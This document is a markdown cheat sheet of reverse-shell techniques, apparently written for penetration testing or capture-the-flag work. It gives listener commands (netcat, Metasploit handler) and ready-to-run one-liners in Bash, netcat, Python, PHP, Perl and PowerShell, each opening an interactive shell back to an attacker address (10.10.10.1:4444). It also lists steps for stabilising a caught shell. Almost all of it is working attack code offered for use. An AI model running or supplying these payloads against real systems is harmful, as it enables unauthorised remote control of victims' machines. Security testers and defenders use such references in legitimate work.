# 🐚 Reverse Shells Cheat Sheet

A **reverse shell** makes the target connect *back* to you, bypassing inbound firewall rules. Start a listener first, then trigger one of the payloads below on the target.

> ⚠️ Replace `10.10.10.1` with **your** attacking IP (`tun0` on a VPN box) and `4444` with your chosen port.

---

## 1. Start a Listener

| Command | Description |
| --- | --- |
| `nc -lvnp 4444` | Basic netcat listener |
| `rlwrap nc -lvnp 4444` | Listener with readline (arrow keys/history) |
| `msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run"` | Metasploit handler |

## 2. Payloads by Language

### Bash
```bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
```

### Bash (alternative, restricted shells)
```bash
0<&196;exec 196<>/dev/tcp/10.10.10.1/4444; sh <&196 >&196 2>&196
```

### Netcat (with -e support)
```bash
nc -e /bin/bash 10.10.10.1 4444
```

### Netcat (no -e — using mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.1 4444 >/tmp/f
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### PHP
```php
php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Perl
```bash
perl -e 'use Socket;$i="10.10.10.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 3. Upgrade / Stabilise the Shell

Once you've caught a basic shell, upgrade it to a fully interactive TTY:

```bash
# Step 1 — spawn a PTY (pick whichever exists on the target)
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   or:  script /dev/null -c bash

# Step 2 — background the shell
Ctrl+Z

# Step 3 — fix your local terminal, then foreground
stty raw -echo; fg
# (press Enter twice)

# Step 4 — set the terminal type & size
export TERM=xterm
stty rows 38 columns 116
```

---

## 🧰 Tip

[**revshells.com**](https://www.revshells.com) generates any of these for a given IP/port/language and includes listener commands. Great when you can't remember the exact syntax mid-engagement.
